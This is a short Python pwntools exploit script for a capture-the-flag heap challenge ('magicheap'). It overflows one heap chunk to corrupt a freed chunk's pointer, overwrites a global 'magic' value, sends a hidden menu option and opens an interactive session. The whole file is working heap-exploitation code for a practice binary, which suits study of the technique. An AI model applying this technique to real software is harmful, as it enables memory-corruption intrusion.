from pwn import *

r = process("./magicheap")

'''
def create(size, data):
    r.sendline("1")
    r.send(str(size))
    r.send(data)

def edit(idx, size, data):
    r.sendline("2")
    r.sendline(str(idx))
    r.sendline(str(size))
    r.send(data)

def delete(idx):
    r.sendline("3")
    r.sendline(str(idx))
'''
def add(size, content):
	print r.recvuntil("Your choice :")
  	r.sendline("1")
  	print r.recvuntil("Size of Heap : ")
  	r.sendline(str(size))
  	print r.recvuntil("Content of heap:")
  	r.send(content)


def edit(index, size, content):
  	print r.recvuntil("Your choice :")
  	r.sendline("2")
  	print r.recvuntil("Index :")
  	r.sendline(str(index))
  	print r.recvuntil("Size of Heap : ")
  	r.sendline(str(size))
  	#print r.recvuntil("Content of heap:")
  	r.sendline(content)

def delete(index):
  	print r.recvuntil("Your choice :")
  	r.sendline("3")
  	print r.recvuntil("Index :")
  	r.sendline(str(index))

magic = 0x6020c0

add(0x100, "A" * 0x100)
add(0x100, "B" * 0x100)
add(0x100, "C" * 0x100)

delete(1)
edit(0, 0x124,"A" * 0x10c + p64(0x111) + p64(0xdeadbeef) + p64(magic-0x10))
add(0x100, "lol")
r.sendline("4869")
#gdb.attach(r)
r.interactive()